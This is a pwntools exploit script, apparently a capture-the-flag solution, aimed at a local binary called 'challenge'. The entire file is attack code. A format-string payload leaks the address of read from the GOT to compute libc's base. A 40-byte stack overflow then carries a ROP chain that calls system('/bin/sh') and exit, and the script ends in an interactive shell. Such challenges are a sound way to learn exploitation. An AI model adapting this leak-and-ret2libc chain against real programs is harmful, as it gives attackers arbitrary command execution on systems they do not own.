from pwn import *

elf = ELF("./challenge")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
rop = ROP(elf)
context.log_level = 'debug'
gs = '''
b main
c
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)
p = start()
p.sendafter(b"send format string:\n", b'%7$sAAAA' + p64(elf.got['read']))
base = u64(p.recv(6) + b"\x00" + b"\x00") - libc.symbols['read']
log.info(f"[*]libc base = {hex(base)}")

pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address
ret = rop.find_gadget(['ret']).address
binsh = next(libc.search(b"/bin/sh\x00")) + base
sys = libc.symbols['system'] + base
exit = libc.symbols['exit'] + base

payload = b"A"*40
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(sys)
payload += p64(pop_rdi)
payload += p64(0)
payload += p64(exit)

p.sendafter(b"send overflow:\n", payload)

p.interactive()